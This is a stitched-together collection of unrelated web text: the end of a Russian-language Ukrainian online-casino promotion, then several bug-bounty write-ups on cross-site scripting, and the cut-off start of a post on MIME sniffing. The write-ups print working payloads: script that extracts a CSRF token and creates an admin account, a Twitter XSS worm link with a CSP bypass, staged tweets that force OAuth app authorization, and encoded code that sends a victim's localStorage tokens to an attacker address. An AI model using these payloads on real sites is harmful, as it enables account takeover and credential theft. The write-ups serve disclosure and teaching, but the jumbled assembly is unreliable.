хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям.

Hi, | by Mo'men Basel | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mo'men Basel 3 min read · May 16, 2019 -- 1 Listen Share from parameter pollution to XSS Hi, I’m going to talk about XSS I found on a website. I noticed that on clicking on any link on the main page it will redirect the user to a page to make sure that the user is aware that this will redirect him/her to another website. the URL looks like this: <redacted>/intersticial.aspx?dest=http://whitelistedWebsite.com Press enter or click to view image in full size once click aceptar you will be redirected I tried editing the whitelistedWebsite.com to javascript:alert(1) but it didn’t work as the URL must match the whitelisted sites. then I tried to redirect to /intersticial.aspx?dest=javascript://whitelistedWebsite.com and opened the chome devtools Press enter or click to view image in full size javascript parameter accepted as a scheme I concluded that the parameter accepts any scheme but a whitelisted website must be added to the scheme. example: /intersticial.aspx?dest=data://whitelistedWebsite.com → Accepted /intersticial.aspx?dest=http://google.com → not Accepted I tried to think for a way to write javascript and the URL together and get the javascript run. I tried to add %0a%0d which adds a newline but redirected to a forbidden page. I started thinking of adding the whitelisted website as a variable then add a semicolon which terminates javascript line but the website doesn’t accept adding a semicolon to this parameter and redirects me to the homepage instead as the URL must be after the scheme directly not after var url=whitelistedWebsite.com. I tried to enter javascript:/whitelistedWebsite.com/i as a value of parameter “dest” and found out that parameter not only accepts schemes like(http://, ftp://) but also accept http:/ and javascript:/. after that Regex immediately came to my thought for those who don’t know about regex it is a sequence of characters that define a search pattern and can be used at almost any programming language. /intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i;alert(document.domain) then website refused the request as it includes a semicolon and I want to put anything to separate this two valid javascript statement to be able to execute JS. then I tried to add another parameter with the same name “dest “ so the URL became <redacted>intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i&dest= Press enter or click to view image in full size Then I noticed that there is a comma added to the URL then added an alert function on the second parameter value and once I clicked acceptar Press enter or click to view image in full size Voilà!, XSS confirmed. the final URL: <redacted>intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i&dest=alert(1) Conclusion: may HTTP parameter pollution don’t lead to serious harm but can help on a bypass that may reach you to P1 or P2 vulnerability. if you find that a parameter accepts redirect to javascript://website.com then you should never lose hope and keep searching!

We’ve been hunting on a private program on HackerOne for a couple weeks with a fair bit of success, but most findings have been medium-ish severity and nothing to write home about. One big thing we noticed is how devastating XSS vulns would be if targeted to admin users. This was because the invitation of new users, including admins, did not require any form of re-authentication/verification before doing so. We had already found quite a few stored XSS, but didn’t really attempt any privilege escalation because in order to create the stored XSS, you would’ve already needed some level of privileged access. So theoretically we could’ve escalated our privileges, but it wouldn’t have been much more severe than the XSS itself. Moving forward to more recently, we had been testing the way 2 of their apps integrate together, which uses OAuth2 authentication. Normally, we’d target things like open redirect or CSRF via static state parameters, but those seemed to be handled well. We did notice some quite odd behavior when handling the redirect_uri parameter. Essentially, if any of the other required parameters were incorrect or missing (such as state , client_id , etc.), you would be redirected to an error page with one button to click on that indicated the bad request. That button was an <a> tag and whatever value that was in the redirect_uri parameter was the href value. So naturally we tried javascript:alert(1) as the redirect_uri parameter, and was presented with a beautiful alert box indicating the XSS was successful. Because we had already found several other XSS’ on this program, it was basically muscle memory to go ahead and submit the report. When doing so, we paused. Remembering back on how their admin/user invitation process looked like, and how an account takeover could easily be performed when finding the right XSS. Alas, this is the perfect XSS to show how easily we can escalate our privileges to an admin level, allowing us to do whatever we’d like. We would be essentially going from zero access (don’t even need a user account, which is important to note as this is an invite only platform), to full access. After taking a closer look at the POST request to create a new admin, it was a multipart form with about 30 fields, but only a few were required. Those were login , firstname , lastname , email , role_id , and of course csrf-token . So the next step was to figure out how to extract the csrf-token , which proved to be quite simple. When performing a GET request to the user creation endpoint and viewing the source, the csrf-token was found stored in a meta tag, which looks like: <meta name=\"csrf-token\" content=\"UdNWofQE+cZSKftgI7GnDpmImM7vTJB9ew3dF53+/Ekwtg2KWw/nRbHdIHIoDd4L+HQ/w7xTUPB2ZHnG01fxnQ==\" /> So we can perform a GET request, store the csrf-token value, and then send a POST request to the same endpoint with the required fields. The code to get the token looks like: var url = \"/ user/new \"; var xhr = new XMLHttpRequest(); xhr.responseType = \"document\"; xhr.open(\"GET\", url, true); xhr.onload = function (e) { if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) { page = xhr.response // Get the csrf token from meta tag token = page.getElementsByName('csrf-token')[0].getAttribute('content') // Show the token console.log(\"The token is: \" + token); } }; xhr.send(null); With this, we now have our CSRF token. The final PoC code to execute the XSS and create ourself an admin user using the token we just extracted looks like: var url = \" /user/new \"; function submitFormWithToken(token) { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", url, true); var formData = new FormData(); formData.append(\"authenticity_token\", token); formData.append(\"login\", \"neemaPoC\"); formData.append(\"firstname\", \"Neema\"); formData.append(\"lastname\", \"PoC\"); formData.append(\"email\", \"xss_demo @gmail.com \"); // role_id = 2 is the admin role formData.append(\"role_ids[]\", 2); formData.append(\"new_status\", \"active\"); xhr.send(formData); } var xhr = new XMLHttpRequest(); xhr.responseType = \"document\"; xhr.open(\"GET\", url, true); xhr.onload = function (e) { if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) { page = xhr.response // Get the csrf token from meta tag token = page.getElementsByName('csrf-token')[0].getAttribute('content') // Show the token console.log(\"The token is: \" + token); // Use the token to submit the form submitFormWithToken(token); } }; // Make the request xhr.send(null); When minified and url encoded, the final PoC reflected XSS URL was (luckily we didn’t have to worry about any length restrictions): https://company.com/oauth2/authorizations/new?redirect_uri=javascript: var%20url%3D%22%2Fuser%2Fnew%22%3Bfunction%20submitFormWithToken%28e%29%7Bvar%20t%3Dnew%20XMLHttpRequest%3Bt.open%28%22POST%22%2Curl%2C%210%29%3Bvar%20n%3Dnew%20FormData%3Bn.append%28%22authenticity_token%22%2Ce%29%2Cn.append%28%22login%22%2C%22neemaPoC%22%29%2Cn.append%28%22firstname%22%2C%22Neema%22%29%2Cn.append%28%22lastname%22%2C%22PoC%22%29%2Cn.append%28%22email%22%2C%22xss_demo%40gmail.com%22%29%2Cn.append%28%22role_ids%5B%5D%22%2C2%29%2Cn.append%28%22new_status%22%2C%22active%22%29%2Ct.send%28n%29%7Dvar%20xhr%3Dnew%20XMLHttpRequest%3Bxhr.responseType%3D%22document%22%2Cxhr.open%28%22GET%22%2Curl%2C%210%29%2Cxhr.onload%3Dfunction%28e%29%7Bxhr.readyState%3D%3D%3DXMLHttpRequest.DONE%26%26200%3D%3D%3Dxhr.status%26%26%28page%3Dxhr.response%2Ctoken%3Dpage.getElementsByName%28%22csrf-token%22%29%5B0%5D.getAttribute%28%22content%22%29%2Cconsole.log%28%22The%20token%20is%3A%20%22%2Btoken%29%2CsubmitFormWithToken%28token%29%29%7D%2Cxhr.send%28null%29%3B When clicked on by the user, the 2 requests would be sent, and our admin account would be created. We received a much anticipated registration email in which can be used to set our credentials, and there are never any notifications/confirmations sent to the victim which essentially makes this undetected unless the victim actively verifies account details. For a full account takeover, we could further escalate and delete the other admins as admin is the highest level of access, and one admin can delete any other. After putting together the working PoC and showing how we could fully exploit this XSS (theoretically as an attacker without a user account), the report was submitted to the team. This was also a great lesson about how to show impact in a report. Historically, as soon as bugs were found, we reported them, without giving much thought in how they could be escalated and showing how bad it really is. This exercise has definitely shown that we should be thinking about this more often. Since this bug, we’ve tried to escalate every XSS popped instead of simply reporting it, and it’s really improved the impact & reward since doing so. Some examples: Reflected XSS -> Create Admin User -> Company Account Takeover = 2x Normal XSS Reward Stored XSS -> Change Victim’s Email -> User Account Takeover = 3x Normal XSS Reward Reflected XSS -> Call API Endpoint returning credit card numbers = 2x Normal XSS Reward Reflected XSS -> Change Victim’s Email -> User Account Takeover = 2x Normal XSS Reward So by instead of just reporting <img src=x onerror=alert(1)> , we’ve started to look at what can actually be done with that XSS, and then write the PoC to prove it as it really shows the company what the impact is, and will most likely net you a better reward. Hope this was helpful in showing how bugs can be exploited and escalated, and how important it is to show impact in a report. We’ll be sharing more about our bug bounty journey, stay tuned!

Prial Islam Khan 4 min read · Jun 5, 2019 -- 5 Listen Share Hi readers , At 1st Eid Mubarak to all . May Allah bring you joy, happiness, peace and prosperity on this blessed occasion. Wishing you and your family on this happy occasion of Eid! Eid Mubarak ! So on this blessed occasion I thought let’s share one of my finding as Eid bonus 😜 ! From title you may came to know this is a write-up about XSS WAF bypass using UNICODE . So let’s give you a small idea about the application I was testing . There was a option called Save for later what saves items in your account for later use . The request looks like :- Press enter or click to view image in full size Our target applications Save for later option request If a user is properly authenticated then this post request will save items in users account for later use and if a user is not properly authenticated then it will just reflect back with some values . So I was manually fuzzing around with parameters and noticed channel parameter value is being reflected in response body without proper escaping in both authenticated & unauthenticated scenario . I send a request with channel parameter value look like “channel”:”xss\\”><” and the response was :- <a class=\"link nc-text-regular nc-blue js-movetocart\" data-giftitemid=\"<ID>\" data-skuid=\"<ID>\" data-itemnumber=\"<ID>\" data-productid=\"<ID>\" data-channel=\"xss\"><\" data-quantity=\"1\" data-isbundleitem=\"false\" role=\"link\" tabindex=\"0\" aria-label=\"label\">Move to cart</a> Our inputted value is inside <a> tag and we can escape out of it as quotes & less-than/greater-than sign is not being filtered properly . So I thought I have a lot of way to do XSS here until I inputted “channel”:”xss\\”onclick=\\”alert(1)” and the response was :- Press enter or click to view image in full size WAF ! WAF ! WAF !!! 🤕 So there is a WAF in place . To bypass it I started fuzzing and the result was :- \"channel\":\"xss\\\"onclick=\\\"alert(1)\" ==> WAF \"channel\":\"xss\\\"xss=\\\"alert(1)\" ==> WAF \"channel\":\"xss\\\"onclick=\\\"alert(1)\" ==> WAF \"channel\":\"xss\\\"xss=\\\"xxx(1)\" ==> No WAF So I tried to create a tag instead of adding event attributes in <a> tag and I inputted “channel”:”xss\\”><xss>test” and the response was :- <a class=\"link nc-text-regular nc-blue js-movetocart\" data-giftitemid=\"<ID>\" data-skuid=\"<ID>\" data-itemnumber=\"<ID>\" data-productid=\"<ID>\" data-channel=\"xss\">test\" data-quantity=\"1\" data-isbundleitem=\"false\" role=\"link\" tabindex=\"0\" aria-label=\"label\">Move to cart</a> So it’s also removing what’s context looks like a tag . So we don’t have advantage of creating a tag . So our only way is using event attributes in <a> tag by bypassing the WAF . So I tried to do a bruteforce using html-event-attributes.txt by fuzzdb to see if any event is not being blocked by WAF and got nothing interesting . Then I though about unicodes and inputted a random unicode to see if it’s decoding in response or not and bingo it’s decoding unicodes to it’s orginal chars . So now I started playing with unicode+events again and the result was :- \"channel\":\"xss\\\"\\u003E\\u003Cxss\\u003Etest\" ==> data-channel=\"xss\"><xss>test\" \"channel\":\"xss\\\"xss=\\\"co\\u006efirm(domain)\" ==> No WAF \"channel\":\"xss\\\"onc\\u006Cick=\\\"co\\u006efirm(domain)\" ==> HTTP/1.1 403 Forbidden So we got a new advantage and also a new problem here . Advantage is we can now create HTML tags using unicodes . Disadvantage is even after using unicodes we are getting a new error HTTP/1.1 403 Forbidden when we add a event onc\\u006Cick . So again I made a wordlist from html-event-attributes.txt + Unicode and I got onmous\\u0045leave & ond\\u0072ag events giving HTTP/1.1 200 OK and also we can create HTML tags . So I made my final payload :- xss\\\"\\u003E\\u003Ch1 onmous\\u0045leave=co\\u006efirm(domain)\\u003ECome to Me\\u003C/h1\\u003E\\u003Cbr\\u003E\\u003C!-- And response body was :- <a class=\"link nc-text-regular nc-blue js-movetocart\" data-giftitemid=\"<ID>\" data-skuid=\"<ID>\" data-itemnumber=\"<ID>\" data-productid=\"<ID>\" data-channel=\"xss\"><h1 onmouseleave=confirm(domain)>come to me</h1><br><!--\" data-quantity=\"1\" data-isbundleitem=\"false\" role=\"link\" tabindex=\"0\" aria-label=\"label\">Move to cart</a> Press enter or click to view image in full size POST based XSS For unauthenticated users Take mouse pointer in come to me and leave it & boom 😎🤗 Now as this is a POST Request and there is no CSRF protection In place so I chained CSRF + XSS = P2 Stored XSS for authenticated users 😎 . Press enter or click to view image in full size CSRF + XSS = P2 Stored XSS for authenticated users 😎 Thanks for reading . Take a look at my YouTube channel for some POC I shared .

TwitterXSSWorm Vulnerability Background In mid-2018, I found a stored XSS on Twitter in the least likely place you could think of. Yes, right in the tweet! But what makes this XSS so special is that it had the potential to be turned into a fully-fledged XSS worm. If the concept of XSS worms is new to you, you might want to read more about it on Wikipedia . A One-click XSS Worm Let me jump right to the full exploit and then we can explain the magic later on. Before this got fixed, tweeting the following URL would have created an XSS worm that spreads from account to account throughout the Twitterverse: https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E “How so? It’s just a link!”, you might wonder. But this, my friend, is no ordinary link. It’s a Welcome Message deeplink 1. The deeplink gets rendered as a Twitter card : A Flaw in Twitter Cards This Twitter card is actually an iframe element which points to https://twitter.com/i/cards/tfw/v1/1114991578353930240 . The iframe is obviously same-origin and not sandboxed (which means we have DOM access to the parent webpage). The payload in the “text” parameter would then get reflected back in an inline JSON object as the value of the default_composer_text key: < script type = \"text/twitter-cards-serialization\" > { \"strings\" : { }, \"card\" : { \"viewer_id\" : \"988260476659404801\" , \"is_caps_enabled\" : true , \"forward\" : \"false\" , \"is_logged_in\" : true , \"is_author\" : true , \"language\" : \"en\" , \"card_name\" : \"2586390716:message_me\" , \"welcome_message_id\" : \"988274596427304964\" , \"token\" : \"[redacted]\" , \"is_emojify_enabled\" : true , \"scribe_context\" : \"%7B%7D\" , \"is_static_view\" : false , \"default_composer_text\" : \"</script><iframe id=__twttr src=/intent/retweet?tweet_id=1114986988128624640></iframe><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12></script><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12> \\ u00A0\" , \"recipient_id\" : \"988260476659404801\" , \"card_uri\" : \"https://t.co/1vVzoyquhh\" , \"render_card\" : true , \"tweet_id\" : \"1114991578353930240\" , \"card_url\" : \"https://t.co/1vVzoyquhh\" }, \"twitter_cldr\" : false , \"scribeData\" : { \"card_name\" : \"2586390716:message_me\" , \"card_url\" : \"https://t.co/1vVzoyquhh\" } } </ script > Note: Once the HTML parser encounters a closing script tag </script> anywhere after the initial opening tag <script> , it gets immediately terminated even when the encountered </script> tag is inside a string literal a comment, or a regex…. Bypassing Input Validation But before you could get to this point, you’d have had to overcome many limitations and obstacles first: Both single and double quotes get escaped to ​\\' and \\\" , respectively. HTML tags get stripped (so a</script>b would become ab ). The payload gets truncated at around 300 characters. There is a CSP policy in place which disallows non-whitelisted inline scripts. At first glance, these might look like proper countermeasures. But the moment I noticed the HTML-tag stripping behavior, my spidey sense started tingling. That’s because this is usually error-prone. Unlike escaping individual characters, stripping tags requires HTML parsing (and parsing is always hard to get right, regexes anybody?). Chaining Vulnerabilities So I started fiddling with a very basic payload </script><svg onload=alert()> and kept fiddling until I ended up with <</<x>/script/test000><</</x><x>svg onload=alert()></><script>1<\\x>2 which got turned into </script/test000><svg onload=alert()> . Jackpot, I immediately reported my finding to the Twitter security team at this point and didn’t wait until I found a bypass for the CSP policy. Bypassing CSP Now, let’s take a closer look at Twitter’s CSP policy: script - src 'nonce-ETj41imzIQ/aBrjFcbynCg==' https : //twitter.com https://*.twimg.com https://ton.twitter.com 'self'; frame-ancestors https://ms2.twitter.com https://twitter.com http://localhost:8889 https://momentmaker-local.twitter.com https://localhost.twitter.com https://tdapi-staging.smf1.twitter.com https://ms5.twitter.com https://momentmaker.twitter.com https://tweetdeck.localhost.twitter.com https://ms3.twitter.com https://tweetdeck.twitter.com https://wfa.twitter.com https://mobile.twitter.com https://ms1.twitter.com 'self' https://ms4.twitter.com; font-src https://twitter.com https://*.twimg.com data: https://ton.twitter.com 'self'; media-src https://twitter.com https://*.twimg.com https://ton.twitter.com blob: 'self'; connect-src https://caps.twitter.com https://cards.twitter.com https://cards-staging.twitter.com https://upload.twitter.com blob: 'self'; style-src https://twitter.com https://*.twimg.com https://ton.twitter.com 'unsafe-inline' 'self'; object-src 'none'; default-src 'self'; frame-src https://twitter.com https://*.twimg.com https://* https://ton.twitter.com 'self'; img-src https://twitter.com https://*.twimg.com data: https://ton.twitter.com blob: 'self'; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXMNQXEZDT&ro=false; An interesting fact is, Twitter doesn’t deploy one global CSP policy throughout the entire app. Instead, different parts of the app have different CSP policies. This is the CSP policy for Twitter cards, and we are only interested in the script-src directive for now. To the trained eye, the wildcard origin https://*.twimg.com looks too permissive and is most likely to be the vulnerable point. So it wasn’t very hard to find a JSONP endpoint on a subdomain of twimg.com : https://syndication.twimg.com/timeline/profile?callback=__twttr;user_id=12 The hard part was, bypassing the callback validation. You can’t simply just specify any callback you like, it must start with the \\_\\_twttr prefix (otherwise, the callback is rejected). This means you can’t pass built-in functions like alert for instance (but you could use \\_\\_twttralert , which of course evaluates to undefined ). I then did a few checks to see which characters are filtered for the callback and which are allowed, and oddly enough, forward slashes were allowed in the “callback” parameter (i.e., ?callback=__twttr/alert ). This would then result in the following response: /**/ __twttr / alert ({ \"headers\" : { \"status\" : 200 , \"maxPosition\" : \"1113300837160222720\" , \"minPosition\" : \"1098761257606307840\" , \"xPolling\" : 30 , \"time\" : 1554668056 }, \"body\" : \"[...]\" }); So now we just need to figure out a way to define a __twttr reference on the window object so we don’t get a ReferenceError exception. There are two ways I could think of to do just that: 1. Find a whitelisted script that defines a __twttr variable and include it in the payload. 2. Set the ID attribute of an HTML element to __twttr (which would create a global reference to that element on the window object). So I went with option #2, and that’s why the iframe element in the payload has an ID attribute despite the fact that we want the payload to be as short as possible. So far, so good. But since we can’t inject arbitrary characters in the callback parameter, this means we are quite limited in what JavaScript syntax we can use (note: the semicolon in ?callback=__twttr/alert;user_id=12 is not part of the callback parameter, it’s actually a URL query separator—the same as “&”). But this is not really much of a problem, as we still can invoke any function we want (similar to a SOME attack ). To sum up what the full payload does: Create an iframe element with the ID “__twttr” which points to a specific tweet using Twitter Web Intents ( https://twitter.com/intent/retweet?tweet_id=1114986988128624640 ). Use the CSP policy bypass to invoke a synchronous function (i.e., alert ) to delay the execution of the next script block until the iframe has fully loaded (the alert is not for show—because of syntax limitations, we cannot simply use setTimeout(func) ). Use the CSP bypass again to submit a form inside the iframe which causes a specific tweet to get retweeted. An XSS worm would ideally spread by retweeting itself. And if there were no syntax limitations, we could have so easily done that. But now that we have to depend on Twitter Web Intents for retweets, we need to know the exact tweet ID and specify that in the payload before actually tweeting it. Quite the dilemma, as tweet IDs are not actually sequential [4] (meaning it won’t be easy to predict the tweet ID beforehand). Oh no, our evil plan is doomed again! Well, not really. There are two other relatively easier ways in which we can make the XSS worm spread: Weaponize a chain of tweets where each tweet in the chain contains a payload that retweets the one preceding it. This way, if you get in contact with any of those tweets, this would initiate a series of retweets which would eventually deliver the first tweet in the chain to every active Twitter account. Simply promote the tweet that carries the XSS payload so it would have much greater reach. Or you could use a mix of those two spreading mechanisms for better results. The possibilities are endless. Also luckily for us, when the “ https://twitter.com/intent/retweet?tweet_id=1114986988128624640 ” page is loaded for an already-retweeted tweet, the frames[0].retweet_btn_form.submit method in the payload would then correspond to a follow action instead of a retweet upon invocation. This means that the first time a weaponized tweet is loaded on your timeline, it’ll immediately get retweeted on your Twitter profile. But the next time you view this tweet again, it will make you follow the attacker’s account! Taking exploitation a step further: Making an XSS worm sure can be fun and amusing, but is that really as far as this can go? In case it wasn’t scary enough for you, this XSS could have also been exploited to force Twitter users into authorizing a malicious third-party app to access their accounts silently and with full permissions via the Twitter “oauth/authorize” API [5]. This could be achieved by loading https://twitter.com/oauth/authorize?oauth_token=[token] in an iframe and then automatically submitting the authorization form included within that page (i.e., the form with the ID oauth_form ). A silent exploit with staged payloads would go as following: Post a tweet with the following as a payload and obtain its ID: </script><iframe src=/oauth/authorize?oauth_token=cXDzjwAAAAAA4_EbAAABaizuCOk></iframe> 2. Post another tweet with the following as a payload and obtain its ID: </script><script id=__twttr src=//syndication.twimg.com/tweets.json?callback=__twttr/parent.frames[0].oauth_form.submit;ids=20></script> 3. Post a third tweet with the following as a payload (which combines the two tweets together in one page) </script><iframe src=/i/cards/tfw/v1/1118608452136460288></iframe><iframe src=/i/cards/tfw/v1/1118609496560029696></iframe> Now as soon as the third tweet gets loaded on a user’s timeline, a malicious third-party app would have full access to their account. The only caveat here is that the “oauth_token” value is valid for one use only and has a relatively short expiry time. But this is not much of a problem either as an attacker could post as many tweets as needed to compromise any number of accounts. The bottom line is, I could have forced you to load any page on Twitter, click any button, submit any form, and what not! P.S. If you want to get in touch, you can find me on Twitter / GitHub .

Here’s the full content:\n\nHow a classical XSS can lead to persistent ATO Vulnerability? | Hackademic Toggle Navigation -> NPTEL Solutions -> Do cool stuff with Python How a classical XSS can lead to persistent ATO Vulnerability? Published by Milind Purswani on June 19, 2019 June 19, 2019 TL;DR (Too long; Do read) Hello Hunters, XSS (Cross Site Scripting) is really one of the most common bugs that we have found atleast once somewhere The thing that is not common is how we report it? Most of the Bug Bounty Programs asses the severity of an issue by considering the worst case impact that a particular POC can demonstrate. For instance, an e-commerce site will not consider a CSRF vulnerability, that can lead to items getting added to victims cart as severe as a CSRF vulnerability, that can force user into changing his email or deleting an account. Similarly, assets like Zomato may not consider it an information disclosure if someone is able to extract public phone numbers and email addresses of their restaurants. It is important to understand your targets before blindly injecting XSS payloads into the form fields. Asking yourself “how is this working?” and what the developer might have thought while working on a particular asset helps you a lot while trying to find bugs. you will end up dreaming about the bugs in the morning and reporting them even if your mother is standing up on your head, admonishing you about brushing your teeth before playing with your laptop. (2/2) — Milind Purswani (@MilindPurswani) June 16, 2019 My friend Yash and I, stumbled across a similar situation while collaborating on a private program. This program in particular had a really small scope and a lot of hackers were working on it before we accepted our invitations. All hackers were given the same credentials for working meaning any xss/template injection that another hacker tried to create could be visible to all the hackers. This is when yash tweeted: This is what happens when multiple hackers are assigned a single group for test accounts haha 😛 #BugBounty #TogetherWeHitHarder pic.twitter.com/ONnVRHktmV — Yash Sodha 🌟 (@y_sodha) March 11, 2019 To be honest, in the beginning it seemed almost impossible to get any injection as the application was heavily secured. It was using Angular in the front end which made it almost impossible to create any injections. By default Angular trusts all user’s input as unsafe. You can read more about it here . It was important to understand the application, and I pretty much got idea about the assets that the web application was trying to protect from their policy page. Since, it was relying on angular in the front-end, trying to create an XSS won’t yield anything. While working with the security team, one of their team members revealed: The application you are testing in: each ‘tenant’ in our system is a ‘company’. The tool is used to onboard new prospects to a client within their company (tenant). Bingo, that’d mean that prospects would have to be invited to the company. It seemed like a feedback portal that is used by tenants to know their customers. But how are the customers getting invited? It turned out that the customers were sent an email to the fill-up some kind of form to onboard themselves. Exploitation So, from my dashboard I sent an email to my other email address and opened the link. This link had the following format: https://REDACTED.com/redacted_url/url;url=http%3A%2F%2FREDACTED.com%3Aanother_redacted_url/ At first it seemed like this was an SSRF but soon Yash pointed out the request getting sent from my browser. This was a let down for me, because at that time I was voraciously looking for an SSRF. I quickly injected my phishing payload https:%2F%2Fmilindpurswani.com%2Fb%2Fphish.html which resulted in phishing page getting popped into the DOM. There was definitely an XSS and upon executing https:// REDACTED.COM /redacted_url/url;url=javascript:alert%28document.domain%29 Normally this’d be enough for demonstrating a working POC. Accoding to the Program’s policy page, since this was a Reflected XSS, it fell under low/medium severity. We were quite satisfied with this and reported the issue hoping it was not a duplicate. For the next few days, there was no response on this report. During this time, Yash and I kept working on this asset and it was no sooner that we realized about a few design flaw in the system. These were not a vulnerability within themselves but when chaining with the XSS bought the severity of this report to High(7.1). A few related observations that we made were: The system was not using cookies to check for authenticated sessions. Instead it was relying on Authorization Header. The website was using Amazon Cognito for user management and for some reason they had a lot of user’s information stored in the local storage. When a user clicks on logout, he is logged-out of the account but if he closes the window, the authorization token was not revoked. If a user logins from his account in multiple devices and then changes the password, his session tokens are not invalidated from other devices. I quickly wrote this javascript code that would steal the authorization tokens and remove his/her session tokens from the browser. The user would think that he was actually logged out from the browser: var xmlhttp = new XMLHttpRequest(); var theUrl = \"attackers-url\"; //Attacker steals the tokens on this address xmlhttp.open(\"POST\", theUrl); xmlhttp.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\"); xmlhttp.send(JSON.stringify({...localStorage})); localStorage.clear(); I tested it within the console and it worked! Now the only thing required was to trigger XSS leading it to execute this code. This is what or final POC looked like. https://REDACTED.com/redacted_url/url;url=javascript:%76%61%72%20%78%6d%6c%68%74%74%70%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%76%61%72%20%74%68%65%55%72%6c%20%3d%20%22%61%74%74%61%63%6b%65%72%73%2d%75%72%6c%22%3b%20%2f%2f%41%74%74%61%63%6b%65%72%20%73%74%65%61%6c%73%20%74%68%65%20%74%6f%6b%65%6e%73%20%6f%6e%20%74%68%69%73%20%61%64%64%72%65%73%73%78%6d%6c%68%74%74%70%2e%6f%70%65%6e%28%22%50%4f%53%54%22%2c%20%74%68%65%55%72%6c%29%3b%78%6d%6c%68%74%74%70%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%22%29%3b%78%6d%6c%68%74%74%70%2e%73%65%6e%64%28%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%7b%2e%2e%2e%6c%6f%63%61%6c%53%74%6f%72%61%67%65%7d%29%29%3b%6c%6f%63%61%6c%53%74%6f%72%61%67%65%2e%63%6c%65%61%72%28%29%3b And the data that we received from the victim’s session looked something like this: {\"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.hkr0x01.accessToken\":\"REDACTED\", \"rememberMe\":\"true\", \"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.hkr0x01.clockDrift\":\"-1\", \"username\":\"hkr0x01\", \"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.LastAuthUser\":\"hkr0x01\", \"CognitoIdentityServiceProvider.69abj1tqnk40eeug2oju2qnaa7.hkr0x01.idToken\":\" REDACTED\"} Moreover, the idToken contained following values: { \"kid\":\"o4Ub0oKqDSdJSEElK\\/nOF1sI79mjLrj0CFNP2fdobCU=\", \"alg\":\"RS256\" } { \"sub\":\"b7bd20bd-c855-4b79-995b-e99fb7f5b61e\", \"email_verified\":true,\"profile\":\"ROLE_TENANT_USER\", \"iss\":\"https:\\/\\/cognito-idp.eu-central-1.amazonaws.com\\/eu-central-1_REDACTED\", \"phone_number_verified\":true, \"cognito:username\":\"hkr0x01\", \"preferred_username\":\"81b619c0-ae28-11e8-9efe-c1f0f85d7f04\", \"given_name\":\"hkr\", \"middle_name\":\"lol\", \"aud\":\"69abj1tqnh40eeug2oju2qnaa7\", \"event_id\":\"3b836566-5dc8-11e9-8441-fd78254b71e5\", \"token_use\":\"id\", \"auth_time\":1555145042, \"phone_number\":\"REDACTED\", \"exp\":1555150790, \"iat\":1555147190, \"family_name\":\"0x01\", \"email\":\"REDACTED ... and then some encrypted values ... Since we were able to fetch the refresh token, we could generate a new authorization token anytime the older one got invalidated. What I learnt? Session tokens when stored in Local Storage, may not necessarily secure the application. It is important to understand the working of an application and then try to adapt the attack vectors so as to create higher impact. Many a times, so called “features” can be leveraged into a vulnerability. One may not be able to discover huge bugs alone, but one can collaborate with your buddies to create stronger attack vectors with innovative approaches.

[The story of weird Google bug bounties] Komodo Research May 15, 2019 4 min read Updated: Oct 23, 2023 Let’s start at the end. This one got me seriously confused. It all started a few months ago when a colleague was hacking away at some Google website. After some poking around, he detected a persistent XSS vulnerability – the attacker’s payload is stored on the server side and returned to the user without encoding. There was only one catch – The Content-Type of the server response was set to ‘multipart/form-data’ meaning that the browser will not evaluate the HTML and will not execute the JavaScript. - “I Think I’ll report it,” my colleague said, “ Maybe it can be exploited with mime-sniffing. ” - “Good luck,” I responded, with a mocking tone. “You know as well as I that mime-sniffing is dead” . - “we’ll see” , he said “I have nothing to loss by reporting” Soon after my Colleague was rewarded by Google with few thousand dollars for this issue. Within few days he detected yet another instance of mime-sniffing-dependent-XSS, and was rewarded with few thousand dollars more. - “What the hell?” I asked him. - “I’m not sure myself”, he replied, “ But if they pay me the bounties I’m not arguing. Besides, maybe they know something we don’t. ” OK, I thought, homework time! MIME sniffing in a nut shell Generally speaking, browsers look at the Content-Type header in the HTTP response for an indication of how the response should be interpreted. Typically, if the application wants the browser to render HTML content, the HTTP response should include the ‘text/html’ content-type. Similarly, ‘image/jpeg’ content-type should be used for images, etc. ‘Typically’ is the crucial word in that sentence, as different browsers tend to have different approaches for evaluating content-types especially when unknown content-types are used (‘unknown’ in the sense that the specific browser does not have clear instructions on how to evaluate it). In such a case, the browser may try to perform mime-sniffing, i.e. try to 